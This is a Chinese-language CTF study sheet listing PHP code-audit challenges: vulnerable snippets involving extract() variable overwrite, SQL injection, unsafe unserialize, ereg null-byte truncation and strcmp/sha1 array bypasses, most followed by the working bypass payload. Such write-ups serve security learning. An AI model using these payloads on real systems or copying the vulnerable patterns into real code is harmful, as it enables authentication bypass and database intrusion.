做ctf题时，遇到审计题时可能会遇到，翻翻记录可以很快的找到脑洞。
http://www.am0s.com/ctf/200.html

1.
$flag='xxx'; 
extract($_GET);
 if(isset($shiyan))
 { 
    $content=trim(file_get_contents($flag));
    if($shiyan==$content)
    { 
        echo'ctf{xxx}'; 
    }
   else
   { 
    echo'Oh.no';
   } 
 }
 
 
 变量覆盖漏洞
PHP <a href="http://www.am0s.com/functions/87.html">extract()</a> 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。
 
file_get_contents：远程获取获取文件，若没有则为空
 
构造shiyan=&amp;flag=1


2.<?php
 
 
$info = ""; 
$req = [];
$flag="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
 
ini_set("display_error", false); 
error_reporting(0); 
 
if(!isset($_GET['number'])){
   header("hint:26966dc52e85af40f59b4fe73d8c323a.txt");
 
   die("have a fun!!");
 
}
 
foreach([$_GET, $_POST] as $global_var) { 
    foreach($global_var as $key => $value) { 
        $value = trim($value); 
        is_string($value) && $req[$key] = addslashes($value); 
    } 
} 
 
 
function is_palindrome_number($number) { 
    $number = strval($number); 
    $i = 0; 
    $j = strlen($number) - 1; 
    while($i < $j) { 
        if($number[$i] !== $number[$j]) { 
            return false; 
        } 
        $i++; 
        $j--; 
    } 
    return true; 
} 
 
 
if(is_numeric($_REQUEST['number']))
{
 
   $info="sorry, you cann't input a number!";
 
}
elseif($req['number']!=strval(intval($req['number'])))
{
 
     $info = "number must be equal to it's integer!! ";  
 
}
else
{
 
     $value1 = intval($req["number"]);
     $value2 = intval(strrev($req["number"]));  
 
     if($value1!=$value2){
          $info="no, this is not a palindrome number!";
     }
     else
     {
 
          if(is_palindrome_number($req["number"])){
              $info = "nice! {$value1} is a palindrome number!"; 
          }
          else
          {
             $info=$flag;
          }
     }
 
}
 
echo $info;

3.

<?php
    include 'common.php';
    $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);
    //把一个或多个数组合并为一个数组
    class db
    {
        public $where;
        function __wakeup()
        {
            if(!empty($this->where))
            {
                $this->select($this->where);
            }
        }
        function select($where)
        {
            $sql = mysql_query('select * from user where '.$where);
            //函数执行一条 MySQL 查询。
            return @mysql_fetch_array($sql);
            //从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false
        }
    }
 
    if(isset($requset['token']))
    //测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。
    {
        $login = unserialize(gzuncompress(base64_decode($requset['token'])));
        //gzuncompress:进行字符串压缩
        //unserialize: 将已序列化的字符串还原回 PHP 的值
 
        $db = new db();
        $row = $db->select('user=''.mysql_real_escape_string($login['user']).''');
        //mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。
 
        if($login['user'] === 'ichunqiu')
        {
            echo $flag;
        }else if($row['pass'] !== $login['pass']){
            echo 'unserialize injection!!';
        }else{
            echo "(╯‵□′)╯︵┴─┴ ";
        }
    }else{
        header('Location: index.php?error=1');
    }
 
?>

<?php
$arr = array('user' => 'ichunqiu');
$a = base64_encode(gzcompress(serialize($arr)));
echo $a;
?>


4.

<?php
error_reporting(0);
 
if (!isset($_POST['uname']) || !isset($_POST['pwd'])) {
    echo '<form action="" method="post">'."<br/>";
    echo '<input name="uname" type="text"/>'."<br/>";
    echo '<input name="pwd" type="text"/>'."<br/>";
    echo '<input type="submit" />'."<br/>";
    echo '</form>'."<br/>";
    echo '<!--source: source.txt-->'."<br/>";
    die;
}
 
function AttackFilter($StrKey,$StrValue,$ArrReq){  
    if (is_array($StrValue)){
 
//检测变量是否是数组
 
        $StrValue=implode($StrValue);
 
//返回由数组元素组合成的字符串
 
    }
    if (preg_match("/".$ArrReq."/is",$StrValue)==1){   
 
//匹配成功一次后就会停止匹配
 
        print "水可载舟，亦可赛艇！";
        exit();
    }
}
 
$filter = "and|select|from|where|union|join|sleep|benchmark|,|(|)";
foreach($_POST as $key=>$value){ 
 
//遍历数组
 
    AttackFilter($key,$value,$filter);
}
 
$con = mysql_connect("XXXXXX","XXXXXX","XXXXXX");
if (!$con){
    die('Could not connect: ' . mysql_error());
}
$db="XXXXXX";
mysql_select_db($db, $con);
 
//设置活动的 MySQL 数据库
 
$sql="SELECT * FROM interest WHERE uname = '{$_POST['uname']}'";
$query = mysql_query($sql); 
 
//执行一条 MySQL 查询
 
if (mysql_num_rows($query) == 1) { 
 
//返回结果集中行的数目
 
    $key = mysql_fetch_array($query);
 
//返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false
 
    if($key['pwd'] == $_POST['pwd']) {
        print "CTF{XXXXXX}";
    }else{
        print "亦可赛艇！";
    }
}else{
    print "一颗赛艇！";
}
mysql_close($con);
?>
 
admin' GROUP BY password WITH ROLLUP LIMIT 1 OFFSET 1-- -


5.
<?php 
if (isset ($_GET['password'])) 
{
  if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
  {
    echo '<p>You password must be alphanumeric</p>';
  }
  else if (strlen($_GET['password']) < 8 &amp;&amp; $_GET['password'] > 9999999)
   {
     if (strpos ($_GET['password'], '*-*') !== FALSE) 
      {
      die('Flag: ' . $flag);
      }
      else
      {
        echo('<p>*-* have not been found</p>'); 
       }
      }
     else 
     {
        echo '<p>Invalid password</p>'; 
      }
   } 
?>
 
<a href="http://www.am0s.com/functions/203.html">ereg漏洞</a>
payload：1e9%00*-*
正则%00截断

6.
if (isset($_GET['a'])) {  
    if (strcmp($_GET['a'], $flag) == 0) 
    //比较两个字符串（区分大小写） 
        die('Flag: '.$flag);  
    else  
        print '离成功更近一步了';  
}

payload:?a[]=1
 漏洞原理http://www.am0s.com/functions/201.html
在5.3的版本之后使用strcmp函数比较会返回0

7.
<?php
if (isset($_GET['name']) and isset($_GET['password'])) 
{
    if ($_GET['name'] == $_GET['password'])
        echo '<p>Your password can not be your name!</p>';
    else if (sha1($_GET['name']) === sha1($_GET['password']))
      die('Flag: '.$flag);
    else
        echo '<p>Invalid password.</p>';
}
else
    echo '<p>Login first!</p>';
?>

===会比较类型，比如bool。
sha1()函数和<a href="http://www.am0s.com/functions/204.html">md5()</a>函数存在着漏洞，sha1()函数默认的传入参数类型是字符串型，那要是给它传入数组呢会出现错误，使sha1()函数返回错误，也就是返回false，这样一来===运算符就可以发挥作用了，需要构造username和password既不相等，又同样是数组类型
?name[]=a&amp;password[]=b

8.
<?php
session_start(); 
if (isset ($_GET['password'])) {
    if ($_GET['password'] == $_SESSION['password'])
        die ('Flag: '.$flag);
    else
        print '<p>Wrong guess.</p>';
}
mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));
?>
 
 
 抓包删掉cookie中的session即可
 
 9.
 
 <?php
 
 
if($_POST[user] &amp;&amp; $_POST[pass]) {
    $conn = mysql_connect("********, "*****", "********");
    mysql_select_db("phpformysql") or die("Could not select database");
    if ($conn->connect_error) {
        die("Connection failed: " . mysql_error($conn));
} 
$user = $_POST[user];
$pass = md5($_POST[pass]);
 
$sql = "select pw from php where user='$user'";
$query = mysql_query($sql);
if (!$query) {
    printf("Error: %sn", mysql_error($conn));
    exit();
}
$row = mysql_fetch_array($query, MYSQL_ASSOC);
//echo $row["pw"];
 
  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) {
 
//如果 str1 小于 str2 返回 < 0； 如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0。
 
 
    echo "<p>Logged in! Key:************** </p>";
}
else {
    echo("<p>Log in failure!</p>");
 
  }
}
?>
 通过构造sql语句使row[pw]等于pass
 
 
 10.
 <?php
if(eregi("hackerDJ",$_GET[id])) {
  echo("<p>not allowed!</p>");
  exit();
}
 
$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "hackerDJ")
{
  echo "<p>Access granted!</p>";
  echo "<p>flag: *****************} </p>";
}
?>
 
 正则漏洞，%00截断
 
 11.
 <?php
 
 
if($_POST[user] &amp;&amp; $_POST[pass]) {
    $conn = mysql_connect("*******", "****", "****");
    mysql_select_db("****") or die("Could not select database");
    if ($conn->connect_error) {
        die("Connection failed: " . mysql_error($conn));
} 
$user = $_POST[user];
$pass = md5($_POST[pass]);
 
$sql = "select user from php where (user='$user') and (pw='$pass')";
$query = mysql_query($sql);
if (!$query) {
    printf("Error: %sn", mysql_error($conn));
    exit();
}
$row = mysql_fetch_array($query, MYSQL_ASSOC);
//echo $row["pw"];
  if($row['user']=="admin") {
    echo "<p>Logged in! Key: *********** </p>";
  }
 
  if($row['user'] != "admin") {
    echo("<p>You are not admin!</p>");
  }
}
 
?>
闭合注入，绕过验证

12.
<?php
function GetIP(){
if(!empty($_SERVER["HTTP_CLIENT_IP"]))
    $cip = $_SERVER["HTTP_CLIENT_IP"];
else if(!empty($_SERVER["HTTP_X_FORWARDED_FOR"]))
    $cip = $_SERVER["HTTP_X_FORWARDED_FOR"];
else if(!empty($_SERVER["REMOTE_ADDR"]))
    $cip = $_SERVER["REMOTE_ADDR"];
else
    $cip = "0.0.0.0";
return $cip;
}
 
$GetIPs = GetIP();
if ($GetIPs=="1.1.1.1"){
echo "Great! Key is *********";
}
else{
echo "错误！你的IP不在访问列表之内！";
}
?>
 添加http头即可
 
 
 13.
 <?php
if($_GET[id]) {
   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $id = intval($_GET[id]);
  $query = @mysql_fetch_array(mysql_query("select content from ctf2 where id='$id'"));
  if ($_GET[id]==1024) {
      echo "<p>no! try again</p>";
  }
  else{
    echo($query[content]);
  }
}
?>

1024.1


15.
   if (isset ($_GET['nctf'])) {
        if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE)
            echo '必须输入数字才行';
        else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)   
            die('Flag: '.$flag);
        else
            echo '骚年，继续努力吧啊~';
    }
 此处还可以数组绕过
 
 16.
 #GOAL: login as admin,then get the flag;
error_reporting(0);
require 'db.inc.php';
 
function clean($str){
    if(get_magic_quotes_gpc()){
        $str=stripslashes($str);
    }
    return htmlentities($str, ENT_QUOTES);
}
 
$username = @clean((string)$_GET['username']);
$password = @clean((string)$_GET['password']);
 
$query='SELECT * FROM users WHERE name=''.$username.'' AND pass=''.$password.'';';
$result=mysql_query($query);
if(!$result || mysql_num_rows($result) < 1){
    die('Invalid password!');
}
 
echo $flag;

$query='SELECT * FROM users WHERE name=''admin'' AND pass=''or 1 #'';';


17.
<?php
if($_POST[user] &amp;&amp; $_POST[pass]) {
   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $user = $_POST[user];
  $pass = md5($_POST[pass]);
  $query = @mysql_fetch_array(mysql_query("select pw from ctf where user=' $user '"));
  if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) {
 
    //strcasecmp:0 - 如果两个字符串相等
 
      echo "<p>Logged in! Key: ntcf{**************} </p>";
  }
  else {
    echo("<p>Log in failure!</p>");
  }
}
?>
payload:user=admin' and 0=1 union select '47bce5c74f589f4867dbd57e9ca9f808' #&amp;pass=aaa
